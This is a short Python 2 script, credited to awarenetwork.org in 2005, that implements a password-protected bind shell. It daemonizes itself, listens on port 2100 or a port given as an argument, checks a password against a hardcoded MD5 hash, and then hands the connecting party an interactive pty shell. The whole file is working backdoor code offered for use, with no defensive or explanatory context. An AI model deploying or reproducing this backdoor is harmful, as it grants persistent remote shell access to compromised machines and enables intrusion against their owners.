# python bindshell, fancy version
# (C) 2005 http://www.awarenetwork.org
# choose hax

import md5,os,sys,select
from pty import spawn, fork
from socket import *

hexa  = "1f88c9132134bf3fda24ab36b82b2d2d" #place your md5 here (d3hydr8)
watch = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)
port  = sys.argv[-1].isdigit() and int(sys.argv[-1]) or 2100
die   = False

if os.fork(): sys.exit(0)

try:
    watch.bind(("0",port))
    watch.listen(5)
except:
    print "[%d] unable to create socket" % os.getpid()
else:
    print "[%d] bindshell on port %d" % (os.getpid(),port)

while True:
    sock, remote = watch.accept()
    if os.fork(): continue
    pid, childID = fork()

    if pid == 0:
        if md5.md5(raw_input("pw: ")).hexdigest().upper() == hexa.upper():
            spawn( raw_input("sh: "))
    else:
        b = sock.makefile(os.O_RDONLY|os.O_NONBLOCK)
        c = os.fdopen(childID,'r+');  data = "";
        x = {b:c,c:b}

        while True:
            for f in select.select([b,c],[],[])[0]:
                try: d = os.read(f.fileno(),4096)
                except: sys.exit(0)
                if f is c and d.strip()==data:
                    data= ""; continue
                x[f].write(d)
                x[f].flush()
                data = d.strip()

    sock.close()
